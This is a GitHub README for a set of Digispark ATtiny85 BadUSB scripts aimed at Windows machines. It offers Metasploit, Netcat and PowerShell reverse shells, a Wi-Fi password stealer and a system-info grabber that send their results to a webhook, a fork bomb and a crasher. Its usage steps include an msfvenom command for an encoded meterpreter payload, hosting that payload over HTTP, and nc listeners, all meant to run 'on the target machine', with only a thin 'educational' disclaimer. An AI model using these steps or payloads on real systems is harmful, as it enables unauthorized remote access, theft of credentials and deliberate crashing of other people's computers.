# 💀 Digispark Attiny85 Scripts for Windows 💀

## 📌 About This Repository

This repository is dedicated to storing scripts for the Digispark Attiny85 while promoting knowledge sharing. The scripts will be updated over time as I gain more experience! 😊

⚠ **Disclaimer:** These scripts are for educational purposes only. Use them at your own risk!

✅ Compatible with **Windows, Linux, and Termux!**

<p align="center">
    <img width="400" height="400" src="https://github.com/EndlssNightmare/Digispark-scripts/assets/110058202/7cf31e71-e6ac-4a74-ac69-3762e93ea66f">
</p>

---

## 🚀 Available Scripts

- **Fakeupdate** 🃏 - Displays a fake Windows update screen.
- **ForkBomb** 💥 - Creates an infinite loop, causing a system crash.
- **Grab-WindowsSysinfo** 👽 - Collects system information.
- **Metasploit-Revshell** 💔 - Reverse shell using Metasploit.
- **Netcat-Revshell** 🐱 - Reverse shell using Netcat.
- **Revshell-ps1** 🐀 - PowerShell-based reverse shell.
- **Steal-Wifi-Passwd** 😈 - Extracts saved Wi-Fi passwords.
- **Wallpaper-Prank** 😵 - Changes desktop wallpaper and hides icons.
- **Windows-Crasher** 💥 - Creates a batch payload to crash Windows.

---

## 🔧 Dependencies

To use these scripts, install the following:

- **Digistump Packages:** [DigistumpArduino](https://github.com/digistump/DigistumpArduino)
- **Digispark ABNT2:** [DigisparkABNT2](https://github.com/jcldf/digisparkABNT2)
- **Arduino IDE:** [Download here](https://www.arduino.cc/en/software)
- **Metasploit Framework:** [Metasploit Website](https://www.metasploit.com)

---

## 📖 How to Use

### 🔹 Fakeupdate

This script opens a fake Windows update website in full screen.

**Steps:**
1. Upload the "Fakeupdate" script to Digispark.
2. Run it on the target machine.

---

### 🔹 ForkBomb

This script runs an infinite loop until the system crashes.

**Steps:**
1. Upload the "ForkBomb" script to Digispark.
2. Run it on the target machine.

---

### 🔹 Grab-WindowsSysinfo

This script extracts system information and sends it via a webhook.

**Steps:**
1. Replace the webhook URL in the script.
2. Upload the "Grab-WindowsSysinfo" script to Digispark.
3. Run it on the target machine.

---

### 🔹 Metasploit-Revshell

This script creates a Metasploit reverse shell.

**Steps:**
1. Generate a payload:
   ```bash
   msfvenom --platform windows -p windows/meterpreter/reverse_tcp lhost=YOUR_IP lport=443 -e x86/shikata_ga_nai -i 7 -f exe -o exploit.exe
   ```
2. Edit `meta.rc` and start Metasploit:
   ```bash
   msfdb reinit && msfconsole -r meta.rc
   ```
3. Host the file:
   ```bash
   python3 -m http.server 80
   ```
4. Upload the "Metasploit-Revshell" script to Digispark and execute it.

---

### 🔹 Netcat-Revshell

This script establishes a reverse shell using Netcat.

**Steps:**
1. Start an HTTP server:
   ```bash
   python3 -m http.server 80
   ```
2. Listen for the connection:
   ```bash
   nc -lvnp 443  # Or use ncat/pwncat-cs
   ```
3. Upload and run the "Netcat-Revshell" script.

---

### 🔹 Revshell-ps1

This PowerShell script creates a reverse shell.

**Steps:**
1. Upload the .ps1 script to a secret GitHub Gist.
2. Copy the raw link into the Arduino IDE.
3. Listen for the connection:
   ```bash
   nc -lvnp 443  # Or use ncat/pwncat-cs
   ```
4. Upload and run the "Revshell-ps1" script.

---

### 🔹 Steal-Wifi-Passwd

This script extracts saved Wi-Fi passwords and sends them via a webhook.

**Steps:**
1. Replace the webhook URL in the script.
2. Upload and run the "Steal-Wifi-Passwd" script.

---

### 🔹 Wallpaper-Prank

This script takes a screenshot of the desktop, sets it as the wallpaper, and hides icons.

**Steps:**
1. Upload and run the "Wallpaper-Prank" script.

---

### 🔹 Windows-Crasher

This script generates a batch file to crash Windows.

**Steps:**
1. Upload and run the "Windows-Crasher" script.

---

## 🔗 References and Credits

- [CedArctic](https://github.com/CedArctic/DigiSpark-Scripts)
- [Brunomlima](https://github.com/brunomlima/Digispark)
- [Gadotti](https://github.com/Gadotti/DigisparkScripts)

---

Enjoy experimenting responsibly! 😈

